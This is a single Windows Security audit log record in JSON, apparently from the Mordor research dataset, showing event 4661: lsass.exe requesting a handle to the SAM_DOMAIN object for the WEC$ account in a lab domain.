{"EventReceivedTime":"2020-07-22 00:18:50","port":55069,"PrivilegeList":"-","SeverityValue":2,"SubjectUserSid":"S-1-5-21-2253742117-2054739524-205962475-1111","Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","Version":1,"ObjectServer":"Security Account Manager","ProcessId":"0x2c0","Channel":"Security","Message":"A handle to an object was requested.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-2253742117-2054739524-205962475-1111\r\n\tAccount Name:\t\tWEC$\r\n\tAccount Domain:\t\tMORDOR\r\n\tLogon ID:\t\t0x578CA4F\r\n\r\nObject:\r\n\tObject Server:\tSecurity Account Manager\r\n\tObject Type:\tSAM_DOMAIN\r\n\tObject Name:\tDC=mordor,DC=local\r\n\tHandle ID:\t0x28a7b842fd0\r\n\r\nProcess Information:\r\n\tProcess ID:\t0x2c0\r\n\tProcess Name:\tC:\\Windows\\System32\\lsass.exe\r\n\r\nAccess Request Information:\r\n\tTransaction ID:\t{00000000-0000-0000-0000-000000000000}\r\n\tAccesses:\tREAD_CONTROL\r\n\t\t\t\tReadOtherParameters\r\n\t\t\t\tCreateUser\r\n\t\t\t\tGetLocalGroupMembership\r\n\t\t\t\t\r\n\tAccess Reasons:\t\t-\r\n\tAccess Mask:\t0x20094\r\n\tPrivileges Used for Access Check:\t-\r\n\tProperties:\t---\r\n\t{19195a5a-6da0-11d0-afd3-00c04fd930c9}\r\nREAD_CONTROL\r\nReadOtherParameters\r\nCreateUser\r\nGetLocalGroupMembership\r\n\t\t{c7407360-20bf-11d0-a768-00aa006e0529}\r\n\t\t\t{bf9679a4-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679a5-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679a6-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679bb-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c2-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c3-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a09-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a0b-0de6-11d0-a285-00aa003049e2}\r\n\t\t{b8119fd0-04f6-4762-ab7a-4986c76b3f9a}\r\n\t\t\t{bf967a34-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a33-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c5-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a61-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967977-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf96795e-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679ea-0de6-11d0-a285-00aa003049e2}\r\n\t\t{ab721a52-1e2f-11d0-9819-00aa0040529b}\r\n\r\n\tRestricted SID Count:\t0","Category":"SAM","@timestamp":"2020-07-22T04:18:51.002Z","SubjectLogonId":"0x578ca4f","ProcessName":"C:\\Windows\\System32\\lsass.exe","RestrictedSidCount":"0","ThreadID":5480,"Task":12803,"RecordNumber":9020785,"Opcode":"Info","TransactionId":"{00000000-0000-0000-0000-000000000000}","Properties":"---\r\n\t{19195a5a-6da0-11d0-afd3-00c04fd930c9}\r\n%%1538\r\n%%5394\r\n%%5396\r\n%%5399\r\n\t\t{c7407360-20bf-11d0-a768-00aa006e0529}\r\n\t\t\t{bf9679a4-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679a5-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679a6-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679bb-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c2-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c3-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a09-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a0b-0de6-11d0-a285-00aa003049e2}\r\n\t\t{b8119fd0-04f6-4762-ab7a-4986c76b3f9a}\r\n\t\t\t{bf967a34-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a33-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679c5-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967a61-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf967977-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf96795e-0de6-11d0-a285-00aa003049e2}\r\n\t\t\t{bf9679ea-0de6-11d0-a285-00aa003049e2}\r\n\t\t{ab721a52-1e2f-11d0-9819-00aa0040529b}\r\n","@version":"1","SourceModuleType":"im_msvistalog","AccessList":"%%1538\r\n\t\t\t\t%%5394\r\n\t\t\t\t%%5396\r\n\t\t\t\t%%5399\r\n\t\t\t\t","tags":["mordorDataset"],"SubjectUserName":"WEC$","SourceName":"Microsoft-Windows-Security-Auditing","HandleId":"0x28a7b842fd0","AccessMask":"0x20094","SourceModuleName":"eventlog","ObjectType":"SAM_DOMAIN","ObjectName":"DC=mordor,DC=local","SubjectDomainName":"MORDOR","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"AccessReason":"-","EventTime":"2020-07-22 00:18:49","Severity":"INFO","EventID":4661}
